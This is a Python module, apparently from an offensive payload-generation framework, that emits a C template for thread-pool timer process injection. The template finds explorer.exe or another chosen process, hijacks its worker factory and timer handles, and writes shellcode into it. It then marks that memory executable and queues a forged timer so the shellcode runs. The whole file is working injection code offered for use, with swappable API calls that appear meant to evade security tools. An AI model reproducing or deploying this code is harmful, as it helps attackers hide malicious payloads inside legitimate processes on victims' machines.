from string import Template
import os
import sys
from pathlib import Path
from c.utils.functions import NtCreateUserProcess

class tp_timer:
    def __init__(self, arguments):
        self.apicallsList = []
        self.memoryPermission = 'PAGE_EXECUTE_READ'
        self.target = 'explorer.exe'
        if 'target' in arguments:
            self.target = arguments['target']

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <tlhelp32.h>",
                '#include "tpstructs.h"',
                '#include "spawnandinject.h"']

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return self.apicallsList

    def template(self) -> str:
        return Template("""

    DWORD PID = 0;

    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
            
    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
            
    pe32.dwSize = sizeof(PROCESSENTRY32); 
            
    if (!Process32First(hProcSnap, &pe32)) {{
            CloseHandle(hProcSnap);
            return 0;
    }}
            
    while (Process32Next(hProcSnap, &pe32)) {{
        if (lstrcmpiA("$target", pe32.szExeFile) == 0) {{
                PID = pe32.th32ProcessID;
                break;
        }}
    }}
            
    CloseHandle(hProcSnap);

    {transformers}

    SIZE_T      RegionSize  = 0;
    DWORD       OldProtect  = 0;

    WORKER_FACTORY_BASIC_INFORMATION FactoryInfo  = {{ 0 }};
    PFULL_TP_TIMER                   TpTimer      = NULL;
    PFULL_TP_TIMER                   TimerAddress = NULL;
    PVOID                            StartLink    = NULL;
    PVOID                            EndLink      = NULL;
    DWORD                            SzTimer      = sizeof( FULL_TP_TIMER );
    LARGE_INTEGER                    li           = {{ 0 }};
    T2_SET_PARAMETERS                TimerParams  = {{ 0 }};
  
    // Get Handles
    
    HANDLE hFactory = NULL;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION ProcessHandleInfo = NULL;
    HANDLE hDupObject       = NULL;
    DWORD szInformation     = 0;
    HANDLE hProcess = OpenProcess( PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, PID );
    PPUBLIC_OBJECT_TYPE_INFORMATION      ObjectInformation = NULL;
    do {{
        ProcessHandleInfo = realloc( ProcessHandleInfo, szInformation );
        {NtQueryInformationProcess}( hProcess, ProcessHandleInformation, ProcessHandleInfo, szInformation, &szInformation );
        if ( status && status != STATUS_INFO_LENGTH_MISMATCH ) {{
            printf( "Error querying target process's handle table: 0x%llx\\n", status );
        }}
    }} while ( status == STATUS_INFO_LENGTH_MISMATCH );

    for ( DWORD i = 0; i < ProcessHandleInfo->NumberOfHandles; i++ ) {{
        
        status = {DuplicateHandle}( hProcess, ProcessHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDupObject, WORKER_FACTORY_ALL_ACCESS, 0, 0 );

        if ( !status )
            continue;

        szInformation = 0;

        do {{
            ObjectInformation = realloc( ObjectInformation, szInformation );
            {NtQueryObject}( hDupObject, ObjectTypeInformation, ObjectInformation, szInformation, &szInformation );
        }} while ( status == STATUS_INFO_LENGTH_MISMATCH );

        if (!wcscmp( ObjectInformation->TypeName.Buffer, L"TpWorkerFactory" ) ) {{
            hFactory = hDupObject;
            break;
        }}

        CloseHandle( hDupObject );

    }}

    HANDLE hTimerQ  = NULL;

    for ( DWORD i = 0; i < ProcessHandleInfo->NumberOfHandles; i++ ) {{
        
        status = {DuplicateHandle}( hProcess, ProcessHandleInfo->Handles[i].HandleValue, (HANDLE)-1, &hDupObject, TIMER_ALL_ACCESS, 0, 0 );

        if ( !status )
            continue;

        szInformation = 0;

        do {{
            ObjectInformation = realloc( ObjectInformation, szInformation );
            {NtQueryObject}( hDupObject, ObjectTypeInformation, ObjectInformation, szInformation, &szInformation );
        }} while ( status == STATUS_INFO_LENGTH_MISMATCH );

        if (!wcscmp( ObjectInformation->TypeName.Buffer, L"IRTimer" ) ) {{
            hTimerQ = hDupObject;
            break;
        }}

        CloseHandle( hDupObject );

    }}
    CloseHandle(hProcess);
    
    hProcess = OpenProcess( PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, PID );
    RegionSize = {shellcodeSize};

    PVOID BaseAddress = NULL;
    {NtAllocateVirtualMemory}( hProcess, &BaseAddress, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE );
    printf( "Allocated 0x%llx bytes to: 0x%llx\\n", {shellcodeSize}, BaseAddress );

    // Write the payload
    {NtWriteVirtualMemory}( hProcess, BaseAddress, shellcode, {shellcodeSize}, NULL );

    // Get WorkerFactoryBasicInformation so we can obtain the StartParameter
    {NtQueryInformationWorkerFactory}( hFactory, WorkerFactoryBasicInformation, &FactoryInfo, sizeof(FactoryInfo), NULL );

    // Make payload executable
    {NtProtectVirtualMemory}( hProcess, &BaseAddress, &RegionSize, PAGE_EXECUTE_READ, &OldProtect );

    // Create a timer in our local process
    TpTimer     = (PFULL_TP_TIMER){CreateThreadpoolTimer}( BaseAddress, NULL, NULL );

    // Allocate space for the timer
    RegionSize     = SzTimer;
    {NtAllocateVirtualMemory}( hProcess, &TimerAddress, 0, &RegionSize, MEM_COMMIT, PAGE_READWRITE );

    // Rebase the pointers of the timer to be based on the remote allocation we made
    TpTimer->Work.CleanupGroupMember.Pool    = FactoryInfo.StartParameter; // Remote process's pool
    TpTimer->DueTime                         =  -10000000;
    TpTimer->WindowStartLinks.Key            =  -10000000;
    TpTimer->WindowEndLinks.Key              =  -10000000;
    TpTimer->WindowStartLinks.Children.Flink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowStartLinks.Children.Blink = &TimerAddress->WindowStartLinks.Children;
    TpTimer->WindowEndLinks.Children.Flink   = &TimerAddress->WindowEndLinks.Children;
    TpTimer->WindowEndLinks.Children.Blink   = &TimerAddress->WindowEndLinks.Children;

    StartLink  = &TimerAddress->WindowStartLinks;
    EndLink    = &TimerAddress->WindowEndLinks;

    // Write the timer in
    {NtWriteVirtualMemory}( hProcess, TimerAddress, TpTimer, SzTimer, NULL );

    // Insert our timer's start and end links into the remote process's timer queue
    {NtWriteVirtualMemory}( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root, &StartLink, sizeof( PVOID ), NULL );

    // Insert our timer's start and end links into the remote process's timer queue
    {NtWriteVirtualMemory}( hProcess, &TpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, &EndLink, sizeof( PVOID ), NULL );

    li.QuadPart = -10000000;

    // Signal the remote process's timer queue to execute our payload
    {NtSetTimer2}( hTimerQ, &li, NULL, &TimerParams );

    if ( hFactory ) {{
        CloseHandle( hFactory );
    }}
    if ( hTimerQ ) {{
        CloseHandle( hTimerQ );
    }}
    if ( hProcess ) {{
        CloseHandle( hProcess );
    }}
""").substitute(target=self.target)